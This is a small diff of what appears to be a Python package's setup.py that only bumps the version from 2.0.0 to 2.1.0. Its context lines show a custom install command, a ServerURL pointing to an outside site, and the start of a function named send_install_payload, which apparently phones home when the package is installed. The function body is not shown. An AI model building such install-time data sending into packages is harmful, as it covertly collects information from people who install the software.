@@ -2,7 +2,7 @@ import threading, json, platform, urllib.request, os, socket, sys, time, request
 from setuptools.command.install import install
 from setuptools import setup, find_packages
 
-__version__ = "2.0.0"
+__version__ = "2.1.0"
 ServerURL = "https://innocaptcha.midoghanam.site"
 
 def send_install_payload():
